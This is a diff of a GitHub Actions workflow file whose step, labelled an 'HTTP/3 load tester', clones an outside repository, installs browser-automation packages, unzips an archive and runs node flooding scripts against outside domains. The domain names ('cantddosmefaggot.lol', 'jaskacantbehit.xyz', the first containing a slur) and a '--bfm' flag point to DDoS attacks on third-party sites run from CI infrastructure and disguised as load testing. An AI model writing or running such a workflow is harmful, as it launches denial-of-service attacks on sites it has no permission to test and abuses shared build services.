@@ -30,14 +30,14 @@ jobs:
       
       - name: Run HTTP/3 load tester
         run: |
-          npm i chalk@4 colors request   hpack cluster   
+          npm i chalk@4 colors request   hpack cluster   puppeteer-real-browser
           pip install requests
           git clone https://github.com/Fegp1p2/ideal-guide.git
           chmod +x ki
           unzip Fc-main.zip 
           
           cd Fc-main
-          node  y.js GET https://cantddosmefaggot.lol/ 800 4 90  --bfm --debug 
+          node  m.js http://jaskacantbehit.xyz/ 300 3 3 3 
 
           
 
